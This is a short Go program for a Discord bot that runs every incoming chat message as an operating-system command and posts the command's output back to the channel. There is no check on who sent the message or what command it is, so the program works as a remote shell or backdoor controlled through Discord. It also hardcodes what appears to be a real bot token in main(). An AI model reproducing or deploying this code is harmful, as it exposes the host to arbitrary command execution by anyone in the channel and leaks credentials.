package main

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"

	"github.com/bwmarrin/discordgo"
)

func onMessageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}
	execCommand(s, m)

}

func redirectOutput(pipe *io.ReadCloser, s *discordgo.Session, m *discordgo.MessageCreate) {
	scanner := bufio.NewScanner(*pipe)
	for scanner.Scan() {
		text := scanner.Text()
		_, err := s.ChannelMessageSend(m.ChannelID, text)
		if err != nil {
			fmt.Println(err)
		}
	}
}

func execCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
	comAndArg := strings.Split(m.Content, " ")
	cmd := exec.Command(comAndArg[0], comAndArg[1:]...)
	outP, err := cmd.StdoutPipe()
	if err != nil {
		fmt.Println(err)
	}
	go redirectOutput(&outP, s, m)
	err = cmd.Start()
	if err != nil {
		fmt.Println(err)
	}
	err = cmd.Wait()
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	discord, err := discordgo.New("Bot " + "NzA5MzMxMzM5MTkwNzMwNzgz.XrkWSg.UkG_W99GydwlcTki_aGMH4q2DLY")
	if err != nil {
		panic(err)
	}
	discord.AddHandler(onMessageCreate)

	err = discord.Open()
	if err != nil {
		fmt.Println("Error opening Discord session: ", err)

	}

	// Wait here until CTRL-C or other term signal is received.
	fmt.Println("Bot is now running.  Press CTRL-C to exit.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc

	// Cleanly close down the Discord session.
	discord.Close()
}
